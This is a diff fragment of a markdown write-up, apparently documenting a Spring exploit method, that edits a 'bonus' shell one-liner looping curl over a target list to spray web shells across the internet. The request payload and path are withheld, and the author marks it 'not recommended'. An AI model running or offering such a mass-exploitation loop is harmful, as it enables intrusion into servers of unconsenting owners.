@@ -22,7 +22,7 @@ I hadn't seen this method posted anywhere, just wanted to document. 99% of this 
 
 Bonus: I guess you could do something like the following to blindly spray webshells across the internet. Not recommended:  
 
-`for i in $(cat targets.txt); do curl --config request.txt $i:$/yougottafixurethisout | tee -a SpringerShellOutput.txt; done`
+`for i in $(cat targets.txt); do curl --config request.txt $i:$/yougottafixurethisout; done`. IYKYK. 
 
 
    
